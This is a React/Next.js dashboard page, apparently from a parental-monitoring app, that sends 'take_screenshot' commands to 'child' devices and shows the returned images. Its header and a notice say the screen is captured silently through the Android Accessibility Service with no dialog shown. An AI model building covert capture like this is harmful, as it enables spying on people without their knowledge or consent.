'use client';
import { useEffect, useState, useCallback, useRef } from 'react';
import { Monitor, Loader, Download, AlertCircle, RefreshCw, Wifi, WifiOff } from 'lucide-react';
import Header from '@/components/Header';
import { devicesApi, userCommandsApi } from '@/lib/api';
import PageLoader from '@/components/PageLoader';
import type { Device } from '@/types';

interface Cmd { id: string; commandType: string; status: string; result: string | null; issuedAt: string; completedAt: string | null; }

const STATUS: Record<string, { label: string; color: string; dot: string }> = {
  pending:   { label: 'Waiting…',  color: 'text-yellow-600', dot: 'bg-yellow-400 animate-pulse' },
  delivered: { label: 'Delivered', color: 'text-blue-600',   dot: 'bg-blue-400 animate-pulse' },
  executing: { label: 'Capturing…',color: 'text-indigo-600', dot: 'bg-indigo-400 animate-pulse' },
  completed: { label: 'Done',      color: 'text-green-600',  dot: 'bg-green-500' },
  failed:    { label: 'Failed',    color: 'text-red-600',    dot: 'bg-red-500' },
};
function fmtTime(s: string) { return new Date(s).toLocaleString('en-IN', { dateStyle: 'short', timeStyle: 'medium' }); }

function ScreenshotCard({ cmd }: { cmd: Cmd }) {
  const st = STATUS[cmd.status] ?? STATUS.pending;
  const isPending = ['pending','delivered','executing'].includes(cmd.status);
  let result: Record<string, unknown> | null = null;
  try { result = cmd.result ? JSON.parse(cmd.result) : null; } catch {}

  return (
    <div className="card overflow-hidden p-0">
      <div className="flex items-center justify-between px-4 py-3 border-b border-gray-100">
        <div className="flex items-center gap-2">
          <Monitor size={14} className="text-cyan-500" />
          <span className="text-sm font-semibold">Screenshot</span>
        </div>
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full ${st.dot}`} />
          <span className={`text-xs font-medium ${st.color}`}>{st.label}</span>
        </div>
      </div>

      {result?.type === 'screenshot' && result.data ? (
        <div className="relative">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src={`data:${result.mimeType ?? 'image/jpeg'};base64,${result.data}`}
            alt="Screenshot" className="w-full object-contain bg-gray-900 max-h-80" />
          <a href={`data:${result.mimeType ?? 'image/jpeg'};base64,${result.data}`}
            download={`screenshot_${cmd.id.slice(0,8)}.jpg`}
            className="absolute bottom-3 right-3 flex items-center gap-1.5 bg-black/60 hover:bg-black/80 text-white text-xs px-3 py-1.5 rounded-full">
            <Download size={12} /> Save
          </a>
        </div>
      ) : isPending ? (
        <div className="flex flex-col items-center justify-center py-10 gap-3 text-gray-400">
          <div className="w-10 h-10 border-4 border-cyan-100 border-t-cyan-500 rounded-full animate-spin" />
          <p className="text-sm">Capturing screen…</p>
        </div>
      ) : result?.type === 'error' ? (
        <div className="flex items-center gap-2 px-4 py-6 text-red-500 text-sm">
          <AlertCircle size={16} /> {String(result.message ?? 'Failed')}
        </div>
      ) : (
        <div className="px-4 py-6 text-gray-400 text-sm">No result yet</div>
      )}
      <div className="px-4 py-2 text-gray-400 text-xs border-t border-gray-100">{fmtTime(cmd.issuedAt)}</div>
    </div>
  );
}

export default function RemoteScreenshotPage() {
  const [devices, setDevices]   = useState<Device[]>([]);
  const [selected, setSelected] = useState('');
  const [commands, setCommands] = useState<Cmd[]>([]);
  const [busy, setBusy]         = useState(false);
  const [loading, setLoading]   = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    devicesApi.list().then((r) => {
      const devs: Device[] = r.data;
      setDevices(devs);
      const first = devs.find((d) => d.role === 'child');
      if (first) setSelected(first.deviceId);
    });
  }, []);

  const fetchCmds = useCallback(async () => {
    if (!selected) return;
    try {
      const r = await userCommandsApi.list(selected);
      setCommands((r.data as Cmd[]).filter((c) => c.commandType === 'take_screenshot'));
    } catch {}
  }, [selected]);

  useEffect(() => {
    if (!selected) return;
    setLoading(true);
    fetchCmds().finally(() => setLoading(false));
    pollRef.current = setInterval(fetchCmds, 2000);
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, [selected, fetchCmds]);

  async function capture() {
    if (!selected) return;
    setBusy(true);
    try { await userCommandsApi.issue(selected, 'take_screenshot'); await fetchCmds(); }
    finally { setBusy(false); }
  }

  const device = devices.find((d) => d.deviceId === selected);

  return (
    <>
      <Header title="Screenshot" subtitle="Capture device screen silently" />
      <main className="flex-1 p-8 space-y-6">
        <div className="card py-4">
          <div className="flex flex-wrap items-center gap-4">
            <div className="flex items-center gap-3">
              <label className="text-sm font-semibold text-gray-700">Device:</label>
              <select value={selected} onChange={(e) => setSelected(e.target.value)} className="input max-w-xs">
                {devices.filter((d) => d.role === 'child').map((d) => (
                  <option key={d.deviceId} value={d.deviceId}>{d.name}</option>
                ))}
              </select>
            </div>
            {device && (
              <div className={`flex items-center gap-1.5 text-sm ${device.isOnline ? 'text-green-600' : 'text-gray-400'}`}>
                {device.isOnline ? <Wifi size={14} /> : <WifiOff size={14} />}
                {device.isOnline ? 'Online' : 'Offline'}
              </div>
            )}
            <button onClick={fetchCmds} className="ml-auto text-gray-400 hover:text-primary"><RefreshCw size={15} /></button>
          </div>
        </div>

        <button onClick={capture} disabled={busy || !selected}
          className="flex items-center gap-2 px-5 py-3 rounded-2xl bg-cyan-500 hover:bg-cyan-600 text-white font-bold text-sm transition-all active:scale-95 disabled:opacity-60 shadow-md">
          {busy ? <Loader size={16} className="animate-spin" /> : <Monitor size={16} />}
          📸 Capture Screen Now
        </button>

        <div className="bg-blue-50 border border-blue-100 rounded-xl px-4 py-3 text-xs text-blue-700">
          Captures the current screen silently using the Accessibility Service (Android 11+). No dialog shown.
        </div>

        {loading ? <PageLoader /> : commands.length === 0 ? (
          <div className="card text-center py-16 text-gray-400">
            <Monitor size={40} className="mx-auto mb-3 opacity-30" />
            <p>No screenshots yet.</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {commands.map((cmd) => <ScreenshotCard key={cmd.id} cmd={cmd} />)}
          </div>
        )}
      </main>
    </>
  );
}
